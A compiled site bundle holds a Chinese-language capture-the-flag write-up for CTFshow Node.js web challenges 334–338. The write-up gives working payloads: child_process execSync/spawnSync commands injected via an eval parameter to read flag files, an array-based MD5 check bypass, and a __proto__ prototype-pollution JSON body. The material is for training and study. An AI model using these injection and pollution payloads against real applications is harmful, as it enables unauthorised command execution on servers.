(window.webpackJsonp=window.webpackJsonp||[]).push([[8],{371:function(s,t,a){"use strict";a.r(t);var n=a(11),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[s._v("nodejs是跨平台的 JavaScript 后端语言，用于开发服务器端应用程序。它能够执行文件读取、数据库查询等服务器端操作")]),s._v(" "),t("p",[s._v("参考文章")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://blog.csdn.net/Yb_140/article/details/124510337",target:"_blank",rel:"noopener noreferrer"}},[s._v("CTFSHOW-nodejs"),t("OutboundLink")],1),s._v(" "),t("a",{attrs:{href:"https://nodejs.cn/api/",target:"_blank",rel:"noopener noreferrer"}},[s._v("node官方文档"),t("OutboundLink")],1),s._v(" "),t("a",{attrs:{href:"https://nodejs.cn/api/child_process.html#child-process",target:"_blank",rel:"noopener noreferrer"}},[s._v("node官方文档--子进程"),t("OutboundLink")],1)]),s._v(" "),t("h2",{attrs:{id:"web-334-审计"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web-334-审计"}},[s._v("#")]),s._v(" web 334 审计")]),s._v(" "),t("p",[s._v("下载文件添加zip扩展名，解压得到两个js文件")]),s._v(" "),t("p",[s._v("user.js里存储了用户名，密码")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/show-nodejs/1.png",alt:"user"}})]),s._v(" "),t("p",[s._v("login.js里存放了登录的操作过程")]),s._v(" "),t("div",{staticClass:"language-js line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-js"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" name"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'CTFSHOW'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" item"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("username "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" name"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("toUpperCase")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" item"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("password "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v(" password"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("关键语句，登录的用户名不能等于“CTFSHOW”,登录用户名的大写等于存放的用户名“CTFSHOW”，密码等于存放的密码“123456”")]),s._v(" "),t("p",[s._v("所以，name=ctfshow，pwd=123456")]),s._v(" "),t("h2",{attrs:{id:"web-335-命令执行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web-335-命令执行"}},[s._v("#")]),s._v(" web 335 命令执行")]),s._v(" "),t("p",[s._v("查看源码，?eval，提示get传参执行命令，类似php的eval函数")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/show-nodejs/2.png",alt:"exec"}})]),s._v(" "),t("p",[s._v("看了这个文档，带exec的应该都能直接执行命令吧(稍加思考)")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('# payload1，成功\n?eval=require("child_process").execSync("ls;tac fl00g.txt");\n# payload2，失败\n?eval=require("child_process").exec("ls");\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("execSync可以执行，exec不能直接执行命令的原因，execSync 是同步函数，它可以直接在 require 语句后调用，并立即返回执行结果，可以直接在一行代码中调用它来执行命令并获取输出。那么同进程的其他命令执行函数也是如此？")]),s._v(" "),t("h2",{attrs:{id:"web-336-命令执行"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web-336-命令执行"}},[s._v("#")]),s._v(" web 336 命令执行")]),s._v(" "),t("p",[s._v("上一题payload打不通了。换个函数，spawnSync()，不要直接像上一题一样写一大坨命令例如：")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('spawnSync("ls;tac flag.txt")\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在这函数规定了似乎不允许")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/show-nodejs/3.png",alt:"spawnSync"}})]),s._v(" "),t("p",[s._v("这个函数执行不能直接输出到页面，用stdout,toString()方法打印出\n来")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v('?eval=require("child_process").spawnSync("tac",[\'fl001g.txt\']).stdout.toString();\n')])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"web-337"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web-337"}},[s._v("#")]),s._v(" web 337")]),s._v(" "),t("p",[s._v("关键代码，接受参数a，b。类似php的一个md5比较，数组绕过")]),s._v(" "),t("div",{staticClass:"language-js line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-js"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" a "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" req"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("query"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("a"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" b "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" req"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("query"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("b"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" b "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" a"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("length"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),s._v("b"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("length "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" a"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),s._v("b "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("md5")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("flag"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("===")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("md5")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("b"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("flag"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    res"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("end")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("flag"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br")])]),t("p",[s._v("url?a[]=1&b[]=1")]),s._v(" "),t("h2",{attrs:{id:"web-338-原型链污染"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#web-338-原型链污染"}},[s._v("#")]),s._v(" web 338 原型链污染")]),s._v(" "),t("p",[s._v("查看routes目录下login.js源码")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/show-nodejs/4.png",alt:"login"}})]),s._v(" "),t("p",[s._v("补充：javascript中，"),t("strong",[s._v("所有对象都继承自一个原型对象，原型对象增加新的属性时，其他对象都会继承")])]),s._v(" "),t("div",{staticClass:"language-js line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-js"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" user "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token literal-property property"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cola"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" tool "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token literal-property property"}},[s._v("tools")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Google"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Object")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("prototype"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("lang "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Python"')]),s._v("\nconsole"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("log")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("tool"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("lang"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//现在，打印结果出现了tool对象不存在的属性lang，从原型对象那里继承得来")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Python")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("代码会通过copy函数，把请求的内容赋值给user对象，如果我们给__proto__原型对象添加一个新的属性来影响原型对象的属性继承，那么就可以达到secert对象的属性ctfshow='36dboy'的条件")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/show-nodejs/6.png",alt:"api"}})]),s._v(" "),t("p",[s._v("查看源码，登录接口需要传json数据")]),s._v(" "),t("p",[s._v('那这里就可以传一个json对象，{"'),t("strong",[s._v("proto")]),s._v('":{"ctfshow":"36dboy"}}，这样就让secert继承到ctfshow=36dboy的属性')])])}),[],!1,null,null,null);t.default=e.exports}}]);